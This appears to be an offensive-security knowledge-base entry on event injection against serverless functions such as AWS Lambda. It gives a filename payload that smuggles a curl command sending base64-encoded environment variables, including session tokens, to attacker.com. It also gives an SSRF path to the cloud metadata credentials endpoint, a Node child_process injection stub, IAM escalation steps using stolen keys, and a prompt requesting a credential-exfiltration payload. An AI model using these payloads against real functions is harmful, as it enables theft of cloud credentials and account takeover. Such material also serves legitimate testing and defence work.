---
id: "serverless-event-injection"
title: "Serverless & FaaS Event Injection (2026)"
type: "technique"
category: "cloud"
subcategory: "serverless"
tags: ["lambda", "s3", "event-injection", "aws", "gcp"]
difficulty: "expert"
updated: "2026-04-18"
---

## Overview
Serverless functions (AWS Lambda, Google Cloud Functions) are often triggered by internal events (S3 uploads, SNS messages, Webhooks). Injection occurs when these events contain untrusted metadata.

## Advanced Attack Vectors

### 1. S3 Event Metadata Injection
If a Lambda processes a filename (`key`) from an S3 `ObjectCreated` event, it may be vulnerable to command injection if that filename is used in a shell or database call.
**Payload (Filename):**
```text
test.jpg; curl http://attacker.com/$(env | base64 | tr -d '\n')
```
When the Lambda executes `graphicsmagick test.jpg; curl...`, it exfiltrates the function's environment variables (including `AWS_SESSION_TOKEN`).

### 2. Event-Driven SSRF
If a function fetches a URL found inside an SNS message or a DynamoDB stream:
- Inject a local metadata IP: `http://169.254.169.254/latest/meta-data/iam/security-credentials/[role]`
- Pivot from the Lambda's IAM role to full cloud takeover.

### 3. FaaS Runtime Injection
Targeting the specific runtime environment (e.g., Python, Node.js, Go).
- Payload: `";/var/lang/bin/node -e 'require("child_process").exec("...")'`

## 2026 Methodology
1. **Identify Triggers:** Map which actions (file uploads, DB updates) trigger background functions.
2. **Exfiltrate Context:** Use OOB (Out-of-Band) techniques to dump the environment.
3. **IAM Escalation:** Use the stolen `AWS_ACCESS_KEY_ID` to check permissions via `iam:GetAccountAuthorizationDetails`.

## Deep Dig Prompts
- "Design an S3-based injection payload to exfiltrate AWS credentials from a Node.js 20.x Lambda function."
